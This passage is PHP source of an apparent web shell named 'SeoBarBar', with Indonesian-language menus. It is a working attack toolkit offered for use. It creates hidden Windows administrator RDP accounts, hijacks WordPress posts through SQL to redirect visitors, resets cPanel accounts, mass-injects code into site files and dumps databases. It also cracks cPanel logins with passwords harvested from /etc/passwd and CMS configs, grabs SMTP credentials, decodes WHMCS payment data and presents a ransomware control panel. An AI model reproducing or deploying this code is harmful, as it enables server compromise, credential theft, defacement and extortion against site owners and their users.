		NB: Sebelum gunain Tools ini , upload dulu file deface kalian di dir /home/user/ dan /home/user/public_html.</center><hr><br>";}}elseif(isset($_GET[hex('adminer')])){echo "<hr><br>";echo "<center><h2>Adminer SeoBarBar</h2>";echo "<input type='submit' class='form-control' value='Spawn Adminer' style='width:250px;height:40px;' name='do_adminer'></center>";echo "<hr><br>";if(isset($_POST['do_adminer'])){$adminer=mari_get_contents("https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-mysql-en.php");file_put_contents("adminer.php",$adminer);$full=str_replace($_SERVER['DOCUMENT_ROOT'],"",$dir);if(file_exists('adminer.php')){echo"<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";}else{echo "<center><font color=red>gagal buat file adminer</font></center>";}}}elseif(isset($_GET[hex('rdp')])){if(strtolower(substr(PHP_OS,0,3))==='win'){if($_POST['create']){$user=htmlspecialchars($_POST['user']);$pass=htmlspecialchars($_POST['pass']);if(preg_match("/$user/",exe("net user"))){echo"[INFO] -> <font color=red>user <font color=lime>$user</font> sudah ada</font>";}else{$add_user=exe("net user $user $pass /add");$add_groups1=exe("net localgroup Administrators $user /add");$add_groups2=exe("net localgroup Administrator $user /add");$add_groups3=exe("net localgroup Administrateur $user /add");echo "[ RDP ACCOUNT INFO ]<br>
                ------------------------------<br>
                IP: <font color=lime>".gethostbyname($_SERVER['HTTP_HOST'])."</font><br>
                Username: <font color=lime>$user</font><br>
                Password: <font color=lime>$pass</font><br>
                ------------------------------<br><br>
                [ STATUS ]<br>
                ------------------------------<br>
                ";if($add_user){echo "[add user] -> <font color='lime'>Berhasil</font><br>";}else{echo "[add user] -> <font color='red'>Gagal</font><br>";}if($add_groups1){echo "[add localgroup Administrators] -> <font color='lime'>Berhasil</font><br>";}elseif($add_groups2){echo "[add localgroup Administrator] -> <font color='lime'>Berhasil</font><br>";}elseif($add_groups3){echo "[add localgroup Administrateur] -> <font color='lime'>Berhasil</font><br>";}else{echo "[add localgroup] -> <font color='red'>Gagal</font><br>";}echo "------------------------------<br>";}}elseif($_POST['s_opsi']){$user=htmlspecialchars($_POST['r_user']);if($_POST['opsi']=='1'){$cek=exe("net user $user");echo"Checking username <font color=lime>$user</font> ....... ";if(preg_match("/$user/",$cek)){echo"[ <font color=lime>Sudah ada</font> ]<br>
                    ------------------------------<br><br>
                    <pre>$cek</pre>";}else{echo "[ <font color=red>belum ada</font> ]";}}elseif($_POST['opsi']=='2'){$cek=exe("net user $user kasini");if(preg_match("/$user/",exe("net user"))){echo "[change password: <font color=lime>kasino</font>] -> ";if($cek){echo "<font color=lime>Berhasil</font>";}else{echo "<font color=red>Gagal</font>";}}else{echo"[INFO] -> <font color=red>user <font color=lime>$user</font> belum ada</font>";}}elseif($_POST['opsi']=='3'){$cek=exe("net user $user /DELETE");if(preg_match("/$user/",exe("net user"))){echo"[remove user: <font color=lime>$user</font>] -> ";if($cek){echo "<font color=lime>Berhasil</font>";}else{echo "<font color=red>Gagal</font>";}}else{echo"[INFO] -> <font color=red>user <font color=lime>$user</font> belum ada</font>";}}else{}}else{echo "<hr><br><center>";echo "<h2>RDP Dono Shell</h2>";echo "-- Create RDP --<br>
            <form method='post'>
            <div class = 'row clearfix'>
            <div class = 'col-md-4'>
            <u>Username:</u>
            <input class ='form-control' style = 'width:250px;height:40px;' type='text' name='user' placeholder='username' value='dono' required>
            </div>
            <div class = 'col-md-4'>
             <u>Password:</u>
            <input class ='form-control' style = 'width:250px;height:40px;' type='text' name='pass' placeholder='password' value='dono' required>
            </div>
            <div class = 'col-md-4'>
            <u>Button:</u>
            <input class ='form-control' style = 'width:250px;height:40px;' type='submit' name='create' value='Gass'>
            </div>
            </div>
            </form><br>
            -- Option --<br>
            <form method='post'>
            <div class = 'row clearfix'>
            <div class = 'col-md-4'>
            <input class ='form-control' style = 'width:250px;height:40px;' type='text' name='r_user' placeholder='username' required>
            </div>
            <div class = 'col-md-4'>
            <select name='opsi' class ='form-control' style = 'width:250px;height:40px;'>
            <option value='1'>Cek Username</option>
            <option value='2'>Ubah Password</option>
            <option value='3'>Hapus Username</option>
            </select>
            </div>
            <div class = 'col-md-4'>
            <input type='submit' name='s_opsi' value='Cek' class ='form-control' style = 'width:250px;height:40px;'>
            </div>
            </div>
            </form><hr><br>
            ";}}else{echo "<font color=red>Fitur ini hanya dapat digunakan dalam Windows Server.</font>";}}elseif(isset($_GET[hex('wp-hijack')])){echo '<form method="POST">
<center><hr><br>			
<img border="0" src="http://www3.0zz0.com/2014/08/20/15/615506358.png">
<h2>Wordpress Hijack Index SeoBarBar</h2><br>
<center>
<div class = "row clearfix ml-5">
<div class= "col-md-2">
<input class="form-control" type="text" value="localhost" name="pghost">
</div>
<div class= "col-md-2">
<input class="form-control" type="text" value="database_name" name="dbnmn">
</div>
<div class= "col-md-2">
<input class="form-control" type="text" value="prefix" name="prefix">
</div>
<div class= "col-md-2">
<input class="form-control" type="text" value="username_db" name="dbusrrrr">
</div>
<div class= "col-md-2">
<input class="form-control" type="text" value="password_db" name="pwddbbn"></center><br>
</div>
</div>
<center><textarea class="form-control" name="pown" cols="85" rows="10"><meta http-equiv="refresh" content="0;URL=http://pastebin.com/raw.php?i=WG1zASMG"></textarea><br>
<input style="width:250px;height:40px;" class="form-control" type="submit" name="up2" value="Hijack Index"><br></center><form><hr><br>';$pghost=$_POST['pghost'];$dbnmn=$_POST['dbnmn'];$dbusrrrr=$_POST['dbusrrrr'];$pwddbbn=$_POST['pwddbbn'];$index=stripslashes($_POST['pown']);$prefix=$_POST['prefix'];if($_POST['up2']){@mysql_connect($pghost,$dbusrrrr,$pwddbbn)or die(mysql_error());@mysql_select_db($dbnmn)or die(mysql_error());$tableName=$prefix."posts";$ghost1=mysql_query("UPDATE $tableName SET post_title ='".$index."' WHERE ID > 0 ");if(!$ghost1){$ghost2=mysql_query("UPDATE $tableName SET post_content ='".$index."' WHERE ID > 0 ");}elseif(!$ghost2){$ghost3=mysql_query("UPDATE $tableName SET post_name ='".$index."' WHERE ID > 0 ");}mysql_close();if($ghost1||$ghost2||$ghost3){echo "<center><p><b><font color='red'>Index Website Have been Hijacked Successfully</font></p></b></center>";}else{echo "<center><p><b><font color='red'>Failed To Hijack the Website :(</font></p></b></center>";}}}elseif(isset($_GET[hex('cpanel-reset')])){echo '
		<hr><br>
         <center>
         <h2>Cpanel Reset SeoBarBar</h2>
         <br><br>
         
  	
  	    <form action="" method="post">
  	    <b> Email : </b>
  	<input type="email" name="email" class = "form-control" style = "width:250px; height:40px;" autocomplete="off"  />
  	<br>
  	<input type="submit" name="submit" value="Reset Password!" class = "form-control" style = "width:250px; height:40px;" />
  	</form>
  	<br>
  	</div>
  	     </center>
  	     <hr><br>
     ';$user=get_current_user();$site=$_SERVER['HTTP_HOST'];$ips=getenv('REMOTE_ADDR');if(isset($_POST['submit'])){$email=$_POST['email'];$wr='email:'.$email;$f=fopen('/home/'.$user.'/.cpanel/contactinfo','w');fwrite($f,$wr);fclose($f);$f=fopen('/home/'.$user.'/.contactinfo','w');fwrite($f,$wr);fclose($f);$parm="Disini : ".$site.':2083/resetpass?start=1';echo '<br/><center>'.$parm.'</center>';};}elseif(isset($_GET[hex('zip-menu')])){$dir=path();echo "<center>";echo "<hr><br>";echo "<h2>Zip Menu</h2>";function rmdir_recursive($dir){foreach(scandir($dir)as $file){if('.'===$file||'..'===$file)continue;if(is_dir("$dir/$file"))rmdir_recursive("$dir/$file");else unlink("$dir/$file");}rmdir($dir);}if($_FILES["zip_file"]["name"]){$filename=$_FILES["zip_file"]["name"];$source=$_FILES["zip_file"]["tmp_name"];$type=$_FILES["zip_file"]["type"];$name=explode(".",$filename);$accepted_types=array('application/zip','application/x-zip-compressed','multipart/x-zip','application/x-compressed');foreach($accepted_types as $mime_type){if($mime_type==$type){$okay=true;break;}}$continue=strtolower($name[1])=='zip'?true:false;if(!$continue){$message="Itu Bukan Zip  , , GOBLOK COK";}$path=dirname(__FILE__).'/';$filenoext=basename($filename,'.zip');$filenoext=basename($filenoext,'.ZIP');$targetdir=$path.$filenoext;$targetzip=$path.$filename;if(is_dir($targetdir))rmdir_recursive($targetdir);mkdir($targetdir,0777);if(move_uploaded_file($source,$targetzip)){$zip=new ZipArchive();$x=$zip->open($targetzip);if($x===true){$zip->extractTo($targetdir);$zip->close();unlink($targetzip);}$message="<b>Sukses Cok :)</b>";}else{$message="<b>Error Jancok :(</b>";}}echo '<table style="width:100%" border="1">
<form enctype="multipart/form-data" method="post" action="">
<label>Zip File : <input type="file" class="form-control" name="zip_file" /></label>
<input type="submit" class="form-control" style="width:250px;" name="submit" value="Upload And Unzip" />
</form><br><br>';if($message)echo"<p>$message</p>";echo"<h2>Zip Backup</h2>
<form action='' method='post'><font style='text-decoration: underline;'>Folder:</font><br>
<input class='form-control' type='text' name='dir' value='$dir' style='width: 450px;' height='10'><br><br>
<font style='text-decoration: underline;'>Save To:</font><br>
<input class='form-control' type='text' name='save' value='$dir/MARIdoNO_backup.zip' style='width: 450px;' height='10'><br><br>
<input class='form-control' type='submit' name='backup' class='kotak' value='Back Up!' style='width: 215px;'></form><br><br>";if($_POST['backup']){$save=$_POST['save'];function Zip($source,$destination){if(extension_loaded('zip')===true){if(file_exists($source)===true){$zip=new ZipArchive();if($zip->open($destination,ZIPARCHIVE::CREATE)===true){$source=realpath($source);if(is_dir($source)===true){$files=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source),RecursiveIteratorIterator::SELF_FIRST);foreach($files as $file){$file=realpath($file);if(is_dir($file)===true){$zip->addEmptyDir(str_replace($source.'/','',$file.'/'));}else if(is_file($file)===true){$zip->addFromString(str_replace($source.'/','',$file),mari_get_contents($file));}}}else if(is_file($source)===true){$zip->addFromString(basename($source),mari_get_contents($source));}}return $zip->close();}}return false;}Zip($_POST['dir'],$save);echo"Selesai , Save To <b>$save</b>";}echo"
        <h2>Unzip Manual</h2>
    <form action='' method='post'><font style='text-decoration: underline;'>Zip Location:</font><br>
    <input class='form-control' type='text' name='dir' value='$dir/file.zip' style='width: 450px;' height='10'><br><br>
    <font style='text-decoration: underline;'>Save To:</font><br>
    <input class='form-control' type='text' name='save' value='$dir/MARIdoNO_unzip' style='width: 450px;' height='10'><br><br>
    <input class='form-control' type='submit' name='extrak' class='kotak' value='Unzip!' style='width: 215px;'></form><br><br>
    ";if($_POST['extrak']){$save=$_POST['save'];$zip=new ZipArchive;$res=$zip->open($_POST['dir']);if($res===TRUE){$zip->extractTo($save);$zip->close();echo 'Succes , Location : <b>'.$save.'</b>';}else{echo 'Gagal Cok :( Ntahlah !';}}echo '</table><hr>';}elseif(isset($_GET[hex('reverse-ip')])){ ?><br><hr><center><h2>Reverse IP SeoBarBar</h2><a href="https://api.hackertarget.com/reverseiplookup/?q=<?php echo $_SERVER['SERVER_ADDR']; ?>"class="form-control"onclick='return window.open("https://api.hackertarget.com/reverseiplookup/?q=<?php echo $_SERVER['SERVER_ADDR']; ?>","POPUP","width=900 0,height=500,scrollbars=10"),!1'style="width:250px">[ Reverse IP Lookup ]</a></center><br><hr><?php }elseif(isset($_GET[hex('ransomware')])){if(version_compare(PHP_VERSION,'7.2.0','>')){echo '<br><br><font color = red>Tools Ransomware Ini Hanya bisa berjalan di PHP versi 7.2 ke bawah saja . untuk PHP versi 7.2 ke atas masih proses pembuatan </font> ';exit;} ?><br><hr><html><head><link href="https://s-media-cache-ak0.pinimg.com/236x/a7/76/ec/a776ec52e575d0473d33557aa610e47d--skull-fashion-flower-tattoos.jpg"rel="icon"type="image/gif"><link href="http://fonts.googleapis.com/css?family=Iceland"rel="stylesheet"type="text/css"><title> SeoBarBar Tr0jan Ransomware </title><style type="text/css">.inpute{width:500px;height:20px;border-color:#ea2a14;color:#0f0;text-align:center}.selecte{border-color:#0f0;width:300px;height:30px;background-color:transparent;color:#0f0}.submite{width:200px;border-color:#ea2a14;background-color:transparent;color:red}.item{background-color:#000}</style></head><body><?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      ?><div class="item"><center><pre>
<font color="lime"><i>
 by dono
 
 System :  <?php echo php_uname()."
"; ?>
 Server : <?php $_SERVER['HTTP_HOST']."
"; ?>
 #Ransomware Ini Berada Pada [dir]: <?php echo getcwd(); ?>/<?php $current_file_name=basename($_SERVER['PHP_SELF']);echo $current_file_name."
"; ?>
 </font>	
</pre><h2><font color="red"face="iceland">Put Your Encryption/Decryption Key Here</h2><form method="post"action=""style="text-align:center"><input name="key"class="inpute"placeholder="KEY ENC/DEC"><br><br><h2><font color="lime"face="iceland">Post Type :</h2><select class="selecte"name="method"><option value="1">Encrypt Files!</option><option value="2">Decrypt Files!</option></select><br><br><br><br><br><input name="submit"value="Execute Virus!"type="submit"class="submite"></form><?php } ?></center></div></body></html><br><hr><?php }elseif(isset($_GET[hex('whois')])){$dir=path(); ?><form method="post"><?php @set_time_limit(0);@error_reporting(0);function sws_domain_info($site){$getip=@mari_get_contents("http://networktools.nl/whois/$site");flush();$ip=@findit($getip,'<pre>','</pre>');return $ip;flush();}function sws_net_info($site){$getip=@mari_get_contents("http://networktools.nl/asinfo/$site");$ip=@findit($getip,'<pre>','</pre>');return $ip;flush();}function sws_site_ser($site){$getip=@mari_get_contents("http://networktools.nl/reverseip/$site");$ip=@findit($getip,'<pre>','</pre>');return $ip;flush();}function sws_sup_dom($site){$getip=@mari_get_contents("http://www.magic-net.info/dns-and-ip-tools.dnslookup?subd=".$site."&Search+subdomains=Find+subdomains");$ip=@findit($getip,'<strong>Nameservers found:</strong>','<script type="text/javascript">');return $ip;flush();}function sws_port_scan($ip){$list_post=array('80','21','22','2082','25','53','110','443','143');foreach($list_post as $o_port){$connect=@fsockopen($ip,$o_port,$errno,$errstr,5);if($connect){echo" $ip : $o_port ??? <u style=\"color: white\">Open</u> <br /><br />";flush();}}}function findit($mytext,$starttag,$endtag){$posLeft=@stripos($mytext,$starttag)+strlen($starttag);$posRight=@stripos($mytext,$endtag,$posLeft+1);return@substr($mytext,$posLeft,$posRight-$posLeft);flush();}echo '<br><br><center>';echo '
    <br /><hr>
	<div class="mybox">
	<h2>Whois SeoBarBar</h2>
	<form method="post"><table class="tabnet">
    <tr><td>Site to scan </td><td>:</td><td>
    <input type="text" name="site" size="50" style="color:black;background-color:#FFF" class="form-control" value="site.com" /> &nbsp <input class="form-control" type="submit" style="color:black;background-color:#FFF" name="scan" value="Scan !" /></td></tr>
    </table></form></div><hr><br>';if(isset($_POST['scan'])){$site=@htmlentities($_POST['site']);if(empty($site)){die('<br /><br /> Not add IP .. !');}$ip_port=@gethostbyname($site);echo"
   <br /><div class=\"sc2\">Scanning [ $site ip $ip_port ] ... </div>
   <div class=\"tit\"> <br /><br />|-------------- Port Server ------------------| <br /></div>
   <div class=\"ru\"> <br /><br /><pre>
   ";echo "".sws_port_scan($ip_port)." </pre></div> ";flush();echo "<div class=\"tit\"><br /><br />|-------------- Domain Info ------------------| <br /> </div>
   <div class=\"ru\">
   <pre>".sws_domain_info($site)."</pre></div>";flush();echo "
   <div class=\"tit\"> <br /><br />|-------------- Network Info ------------------| <br /></div>
   <div class=\"ru\">
   <pre>".sws_net_info($site)."</pre> </div>";flush();echo "<div class=\"tit\"> <br /><br />|-------------- subdomains Server ------------------| <br /></div>
   <div class=\"ru\">
   <pre>".sws_sup_dom($site)."</pre> </div>";flush();echo "<div class=\"tit\"> <br /><br />|-------------- Site Server ------------------| <br /></div>
   <div class=\"ru\">
   <pre>".sws_site_ser($site)."</pre> </div>
   <div class=\"tit\"> <br /><br />|-------------- END ------------------| <br /></div>";flush();}echo '</center>';}elseif(isset($_GET[hex('phpinfo')])){echo "<hr><br><center>";echo "<h2>Server Php Info</h2>";echo phpinfo();echo "<hr><br></center>";}elseif(isset($_GET[hex('inject-code')])){echo "<hr><br>";echo '<center><h2>Mass Code Injector SeoBarBar</h2></center>';if(stristr(php_uname(),"Windows")){$DS="\";}else if(stristr(php_uname(),"Linux")){$DS='/';}function get_structure($path,$depth){global $DS;$res=array();if(in_array(0,$depth)){$res[]=$path;}if(in_array(1,$depth)or in_array(2,$depth)or in_array(3,$depth)){$tmp1=glob($path.$DS.'*',GLOB_ONLYDIR);if(in_array(1,$depth)){$res=array_merge($res,$tmp1);}}if(in_array(2,$depth)or in_array(3,$depth)){$tmp2=array();foreach($tmp1 as $t){$tp2=glob($t.$DS.'*',GLOB_ONLYDIR);$tmp2=array_merge($tmp2,$tp2);}if(in_array(2,$depth)){$res=array_merge($res,$tmp2);}}if(in_array(3,$depth)){$tmp3=array();foreach($tmp2 as $t){$tp3=glob($t.$DS.'*',GLOB_ONLYDIR);$tmp3=array_merge($tmp3,$tp3);}$res=array_merge($res,$tmp3);}return $res;}if(isset($_POST['submit'])&&$_POST['submit']=='Inject'){$name=$_POST['name']?$_POST['name']:'*';$type=$_POST['type']?$_POST['type']:'html';$path=$_POST['path']?$_POST['path']:getcwd();$code=$_POST['code']?$_POST['code']:'Panen138';$mode=$_POST['mode']?$_POST['mode']:'a';$depth=sizeof($_POST['depth'])?$_POST['depth']:array('0');$dt=get_structure($path,$depth);foreach($dt as $d){if($mode=='a'){if(file_put_contents($d.$DS.$name.'.'.$type,$code,FILE_APPEND|LOCK_EX)){echo '<div><strong>'.$d.$DS.$name.'.'.$type.'</strong><span style="color:red;"> was injected</span></div>';}else{echo '<div><span style="color:red;">failed to inject</span> <strong>'.$d.$DS.$name.'.'.$type.'</strong></div>';}}else{if(file_put_contents($d.$DS.$name.'.'.$type,$code)){echo '<div><strong>'.$d.$DS.$name.'.'.$type.'</strong><span style="color:red;"> was injected</span></div>';}else{echo '<div><span style="color:red;">failed to inject</span> <strong>'.$d.$DS.$name.'.'.$type.'</strong></div>';}}}}else{echo '<form method="post" action="">
        <center>
                <table align="center">
                    <tr><br>
                        <td>Directory : </td>
                        <td><input class = "form-control" type = "text" class="box" name="path" value="'.getcwd().'" size="50"/></td>
                    </tr>
                    <tr>
                        <td class="title">Mode : </td>
                        <td>
                            <select class = "form-control" style="width: 150px;" name="mode" class="box">
                                <option value="a">Apender</option>
                                <option value="w">Overwriter</option>
                            </select>
                        </td>
                    </tr>
                    <tr>
                        <td class="title">File Name & Type : </td>
                        <td class="inline"><br>
                            <input class = "form-control" type="text" style="width: 100px;" name="name" value="*"/>&nbsp;&nbsp;
                         
                            <select class = "form-control" style="width: 150px;" name="type" class="box">
                            <option value="html">HTML</option>
                            <option value="htm">HTM</option>
                            <option value="php" selected="selected">PHP</option>
                            <option value="asp">ASP</option>
                            <option value="aspx">ASPX</option>
                            <option value="xml">XML</option>
                            <option value="txt">TXT</option>
                        </select></td>
                    </tr>
                    <tr>
                        <td class="title">Code Inject Depth : </td>
                        <td class="inline">
                            <input type="checkbox" name="depth[]" value="0" checked="checked"/>&nbsp;0&nbsp;&nbsp;
                            <input type="checkbox" name="depth[]" value="1"/>&nbsp;1&nbsp;&nbsp;
                            <input type="checkbox" name="depth[]" value="2"/>&nbsp;2&nbsp;&nbsp;
                            <input type="checkbox" name="depth[]" value="3"/>&nbsp;3
                        </td>
                    </tr>        
                    <tr>
                        <td colspan="2"><textarea class = "form-control" name="code" style= "width:100%"></textarea></td>
                    </tr>                        
                    <tr>
                        <td colspan="2" style="text-align: center;">
                            <input type="hidden" name="a" value="Injector">
                            <input type="hidden" name="c" value="'.htmlspecialchars($GLOBALS['cwd']).'">
                            <input type="hidden" name="p1">
                            <input type="hidden" name="p2">
                            <input type="hidden" name="charset" value="'.(isset($_POST['charset'])?$_POST['charset']:'').'">
                            <input class = "form-control" style="padding :5px; width:100px;" name="submit" type="submit" value="Inject"/></td>
                    <br></tr>
                </table>
        </form>';}echo "<hr><br>";}elseif(isset($_GET[hex('db-dump')])){echo '
<center><hr><br>
<form action method=post>
<table width=371 class=tabnet >
<h2>Database Dumper SeoBarBar</h2>
<tr>
	<td>Server </td>
	<td><input class="form-control" type=text name=server size=52 autocomplete = "off"></td></tr><tr>
	<td>Username</td>
	<td><input class="form-control" type=text name=username size=52 autocomplete = "off"></td></tr><tr>
	<td>Password</td>
	<td><input class="form-control" type=text name=password size=52 autocomplete = "off"></td></tr><tr>
	<td>DataBase Name</td>
	<td><input class="form-control" type=text name=dbname size=52 autocomplete = "off"></td></tr>
	<tr>
	<td>DB Type </td>
	<td><form method=post action="'.$me.'">
	<select class="form-control" name=method>
		<option  value="gzip">Gzip</option>
		<option value="sql">Sql</option>
		</select>
		<br>
	<input class="form-control" type=submit value="  Dump!  " ></td></tr>
	</form></center></table></div><hr><br>';if($_POST['username']&&$_POST['dbname']&&$_POST['method']){$date=date("Y-m-d");$dbserver=$_POST['server'];$dbuser=$_POST['username'];$dbpass=$_POST['password'];$dbname=$_POST['dbname'];$file="Dump-$dbname-$date";$method=$_POST['method'];if($method=='sql'){$file="Dump-$dbname-$date.sql";$fp=fopen($file,"w");}else{$file="Dump-$dbname-$date.sql.gz";$fp=gzopen($file,"w");}function write($data){global $fp;if($_POST['method']=='ssql'){fwrite($fp,$data);}else{gzwrite($fp,$data);}}mysql_connect($dbserver,$dbuser,$dbpass);mysql_select_db($dbname);$tables=mysql_query("SHOW TABLES");while($i=mysql_fetch_array($tables)){$i=$i['Tables_in_'.$dbname];$create=mysql_fetch_array(mysql_query("SHOW CREATE TABLE ".$i));write($create['Create Table'].";nn");$sql=mysql_query("SELECT * FROM ".$i);if(mysql_num_rows($sql)){while($row=mysql_fetch_row($sql)){foreach($row as $j=>$k){$row[$j]="'".mysql_escape_string($k)."'";}write("INSERT INTO $i VALUES(".implode(",",$row).");n");}}}if($method=='ssql'){fclose($fp);}else{gzclose($fp);}header("Content-Disposition: attachment; filename=".$file);header("Content-Type: application/download");header("Content-Length: ".filesize($file));flush();$fp=fopen($file,"r");while(!feof($fp)){echo fread($fp,65536);flush();}fclose($fp);}}elseif(isset($_GET[hex('cp-crack')])){if($_POST['crack']){$usercp=explode("
",$_POST['user_cp']);$passcp=explode("
",$_POST['pass_cp']);$i=0;foreach($usercp as $ucp){foreach($passcp as $pcp){if(@mysql_connect('localhost',$ucp,$pcp)){if($_SESSION[$ucp]&&$_SESSION[$pcp]){}else{$_SESSION[$ucp]="1";$_SESSION[$pcp]="1";if($ucp==''||$pcp==''){}else{$i++;if(function_exists('posix_getpwuid')){$domain_cp=mari_get_contents("/etc/named.conf");if($domain_cp==''){$dom="<font color=red>gabisa ambil nama domain nya</font>";}else{preg_match_all("#/var/named/(.*?).db#",$domain_cp,$domains_cp);foreach($domains_cp[1]as $dj){$user_cp_url=posix_getpwuid(@fileowner("/etc/valiases/$dj"));$user_cp_url=$user_cp_url['name'];if($user_cp_url==$ucp){$dom="<a href='http://$dj/' target='_blank'><font color=lime>$dj</font></a>";break;}}}}else{$dom="<font color=red>function is Disable by system</font>";}echo"username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>) domain ($dom)<br>";}}}}}if($i==0){}else{echo "<br>sukses nyolong ".$i." Cpanel by <font color=lime>Exc Shell.</font>";}}else{echo "<center><hr><br>
		<form method='post'>
		<h2>Cpanel Crack SeoBarBar</h2>
		USER: <br>
		<textarea class = 'form-control' style='width: 450px; height: 150px;' name='user_cp'>";$_usercp=fopen("/etc/passwd","r");while($getu=fgets($_usercp)){if($getu==''||!$_usercp){echo "<font color=red>Can't read /etc/passwd</font>";}else{preg_match_all("/(.*?):x:/",$getu,$u);foreach($u[1]as $user_cp){if(is_dir("/home/$user_cp/public_html")){echo"$user_cp
";}}}}echo "</textarea><br>
		PASS: <br>
		<textarea class= 'form-control' style='width: 450px; height: 200px;' name='pass_cp'>";function cp_pass($dir){$pass="";if(isset($dir)){$dira=scandir($dir);foreach($dira as $dirb){if(!is_file("$dir/$dirb"))continue;$ambil=mari_get_contents("$dir/$dirb");if(preg_match("/WordPress/",$ambil)){$pass.=ambilkata($ambil,"DB_PASSWORD', '","'")."
";}elseif(preg_match("/JConfig|joomla/",$ambil)){$pass.=ambilkata($ambil,"password = '","'")."
";}elseif(preg_match("/Magento|Mage_Core/",$ambil)){$pass.=ambilkata($ambil,"<password><![CDATA[","]]></password>")."
";}elseif(preg_match("/panggil fungsi validasi xss dan injection/",$ambil)){$pass.=ambilkata($ambil,'password = "','"')."
";}elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$ambil)){$pass.=ambilkata($ambil,"'DB_PASSWORD', '","'")."
";}elseif(preg_match("/client/",$ambil)){preg_match("/password=(.*)/",$ambil,$pass1);$pass.=$pass1[1]."
";if(preg_match('/"/',$pass1[1])){$pass1[1]=str_replace('"',"",$pass1[1]);$pass.=$pass1[1]."
";}}elseif(preg_match("/cc_encryption_hash/",$ambil)){$pass.=ambilkata($ambil,"db_password = '","'")."
";}}}echo $pass;}$cp_pass=cp_pass($dir);if(isset($cp_pass)){echo $cp_pass;}echo "</textarea><br>
		<input class = 'form-control' type='submit' name='crack' style='width: 450px;' value='Crack'>
		</form><br>
		<span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center><hr><br>";}}elseif(isset($_GET[hex('smtp-grab')])){$dir=path();echo "<center><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span></center><br>";function scj($dir){$dira=scandir($dir);foreach($dira as $dirb){if(!is_file("$dir/$dirb"))continue;$ambil=mari_get_contents("$dir/$dirb");$ambil=str_replace("$","",$ambil);if(preg_match("/JConfig|joomla/",$ambil)){$smtp_host=ambilkata($ambil,"smtphost = '","'");$smtp_auth=ambilkata($ambil,"smtpauth = '","'");$smtp_user=ambilkata($ambil,"smtpuser = '","'");$smtp_pass=ambilkata($ambil,"smtppass = '","'");$smtp_port=ambilkata($ambil,"smtpport = '","'");$smtp_secure=ambilkata($ambil,"smtpsecure = '","'");echo "<center>";echo"SMTP Host: <font color=lime>$smtp_host</font><br>";echo"SMTP port: <font color=lime>$smtp_port</font><br>";echo"SMTP user: <font color=lime>$smtp_user</font><br>";echo"SMTP pass: <font color=lime>$smtp_pass</font><br>";echo"SMTP auth: <font color=lime>$smtp_auth</font><br>";echo"SMTP secure: <font color=lime>$smtp_secure</font><br><br>";echo "</center>";}}}$smpt_hunter=scj($dir);echo $smpt_hunter;}elseif(isset($_GET[hex('domains')])){echo "<center>
		<div class='mybox'>
		<p align='center' class='cgx2'>Domains and Users</p>";$d0mains=@file("/etc/named.conf");if(!$d0mains){die("<center>Error : can't read [ /etc/named.conf ]</center>");}echo '<table id="output"><tr bgcolor=#cecece><td>Domains</td><td>users</td></tr>';foreach($d0mains as $d0main){if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#',$d0main,$domains);flush();if(strlen(trim($domains[1][0]))>2){$user=posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));echo "<tr><td><a href=http://www.".$domains[1][0]."/>".$domains[1][0]."</a></td><td>".$user['name']."</td></tr>";flush();}}}echo '</div></center>';}elseif(isset($_GET[hex('whmcs-decoder')])){echo '<form action="" method="post">';function decrypt($string,$cc_encryption_hash){$key=md5(md5($cc_encryption_hash)).md5($cc_encryption_hash);$hash_key=_hash($key);$hash_length=strlen($hash_key);$string=base64_decode($string);$tmp_iv=substr($string,0,$hash_length);$string=substr($string,$hash_length,strlen($string)-$hash_length);$iv=$out='';$c=0;while($c<$hash_length){$iv.=chr(ord($tmp_iv[$c])^ord($hash_key[$c]));++$c;}$key=$iv;$c=0;while($c<strlen($string)){if(($c!=0 and $c%$hash_length==0)){$key=_hash($key.substr($out,$c-$hash_length,$hash_length));}$out.=chr(ord($key[$c%$hash_length])^ord($string[$c]));++$c;}return $out;}function _hash($string){if(function_exists('sha1')){$hash=sha1($string);}else{$hash=md5($string);}$out='';$c=0;while($c<strlen($hash)){$out.=chr(hexdec($hash[$c].$hash[$c+1]));$c+=2;}return $out;}echo "
<hr><br>
<br><center><h2>Whmcs Decoder SeoBarBar</h2></center>
<center>
<br>
<FORM action=''  method='post'>
<input type='hidden' name='form_action' value='2'>
<br>
<table class=tabnet style=width:320px;padding:0 1px;>
<tr><th colspan=2>WHMCS Decoder</th></tr>
<tr><td>db_host </td><td><input  type='text' style='color:#000;background-color:' class='form-control' size='38' name='db_host' value='localhost'></td></tr>
<tr><td>db_username </td><td><input type='text' style='color:#000;background-color:' class='form-control' size='38' name='db_username' value=''></td></tr>
<tr><td>db_password</td><td><input type='text' style='color:#000;background-color:' class='form-control' size='38' name='db_password' value=''></td></tr>
<tr><td>db_name</td><td><input type='text' style='color:#000;background-color:' class='form-control' size='38' name='db_name' value=''></td></tr>
<tr><td>cc_encryption_hash</td><td><input style='color:#000;background-color:' type='text' class='form-control' size='38' name='cc_encryption_hash' value=''></td></tr>
